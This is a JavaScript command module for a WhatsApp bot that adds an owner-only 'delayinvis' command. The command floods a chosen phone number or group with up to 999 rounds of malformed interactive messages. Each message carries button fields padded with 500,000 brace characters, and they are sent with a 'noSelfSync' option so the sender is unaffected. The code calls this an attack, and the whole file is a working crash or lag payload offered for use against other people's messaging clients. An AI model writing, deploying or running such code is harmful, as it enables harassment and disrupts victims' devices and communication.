const fs = require('fs');
const path = require('path');
const { reply, box, normalizeJidNumber } = require('../../helper');

// ─── SETTINGS FILE ─────────────────────────────────────────────────────
const dataDir = path.join(__dirname, '../../data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
const settingsFile = path.join(dataDir, 'delayinvis.json');

function loadSettings() {
    try {
        if (!fs.existsSync(settingsFile)) {
            const fresh = { perBot: {} };
            fs.writeFileSync(settingsFile, JSON.stringify(fresh, null, 2));
            return fresh;
        }
        const data = JSON.parse(fs.readFileSync(settingsFile, 'utf-8'));
        if (!data.perBot) data.perBot = {};
        return data;
    } catch (e) {
        return { perBot: {} };
    }
}

let settings = loadSettings();

function saveSettings() {
    fs.writeFileSync(settingsFile, JSON.stringify(settings, null, 2));
}

// ─── IN THIS EKONOMI (delay payload, noSelfSync) ─────────────────────
async function InThisEkonomi(sock, target) {
    const Asilent1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: " im the silencer " },
                    nativeFlowMessage: {
                        buttons: "{".repeat(500000),
                    },
                },
            },
        },
    };

    const Asilent2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "im the queen mia" },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(500000),
                    },
                },
            },
        },
    };

    try {
        // noSelfSync: sender won't be affected / won't see the payload
        await sock.relayMessage(target, Asilent1, { noSelfSync: true });
        await new Promise((resolve) => setTimeout(resolve, 500));
        await sock.relayMessage(target, Asilent2, { noSelfSync: true });
    } catch (error) {
        console.error("[DELAYINVIS] Error sending payload:", error.message);
    }
}

// ─── ATTACK WRAPPER ──────────────────────────────────────────────────
async function delayinvisAttack(sock, target, rounds = 999) {
    let successCount = 0;
    for (let i = 0; i < rounds; i++) {
        try {
            await InThisEkonomi(sock, target);
            successCount++;
            console.log(`[DELAYINVIS] Round ${i + 1}/${rounds} sent to ${target}`);
        } catch (err) {
            console.error(`[DELAYINVIS] Round ${i + 1} error:`, err.message);
        }
        await new Promise(resolve => setTimeout(resolve, 200));
    }
    return successCount;
}

// ─── COMMAND HANDLER ──────────────────────────────────────────────────
async function handleDelayinvisCommand(sock, jid, msg, command, params, sender, senderIsOwner) {
    if (command !== 'delayinvis') return false;

    if (!senderIsOwner) {
        await reply(sock, jid, msg, box('DELAYINVIS', '❌ Only owners can use this command.'));
        return true;
    }

    if (params.length === 0) {
        const usage =
`╭━━━━━━━━━━━━━━━━━━━━
┃  *DELAYINVIS*
┃━━━━━━━━━━━━━━━━━━━━
┃  ${command} <number> [rounds]
┃  ${command} here [rounds]
┃
┃  noSelfSync — sender won't be affected
╰━━━━━━━━━━━━━━━━━━━━`;
        await reply(sock, jid, msg, box('DELAYINVIS', usage));
        return true;
    }

    let target;
    let rounds = 999;

    const firstArg = params[0].toLowerCase();
    if (firstArg === 'here') {
        if (!jid.endsWith('@g.us')) {
            await reply(sock, jid, msg, box('DELAYINVIS', '❌ "here" can only be used in a group.'));
            return true;
        }
        target = jid;
        if (params.length > 1) {
            const r = parseInt(params[1]);
            if (!isNaN(r) && r > 0 && r <= 999) rounds = r;
        }
    } else {
        const raw = params[0].replace(/[^0-9]/g, '');
        if (raw.length < 6) {
            await reply(sock, jid, msg, box('DELAYINVIS', '❌ Invalid number. Use e.g. 2547xxxxxxx'));
            return true;
        }
        target = raw + '@s.whatsapp.net';
        if (params.length > 1) {
            const r = parseInt(params[1]);
            if (!isNaN(r) && r > 0 && r <= 999) rounds = r;
        }
    }

    await reply(sock, jid, msg, box('DELAYINVIS', `⚠️ Sending ${rounds} round(s) to ${target}...`));
    const sent = await delayinvisAttack(sock, target, rounds);
    if (sent > 0) {
        await reply(sock, jid, msg, box('DELAYINVIS', `✅ ${sent}/${rounds} round(s) sent to ${target}`));
    } else {
        await reply(sock, jid, msg, box('DELAYINVIS', `❌ Attack failed. Check console.`));
    }
    return true;
}

function attachDelayinvisHandlers(sock) {}

module.exports = {
    handleDelayinvisCommand,
    attachDelayinvisHandlers
};

// ─── HOT RELOAD ───────────────────────────────────────────────────────
require('fs').watchFile(require.resolve(__filename), { interval: 500 }, () => {
    require('fs').unwatchFile(require.resolve(__filename));
    delete require.cache[require.resolve(__filename)];
    require(__filename);
});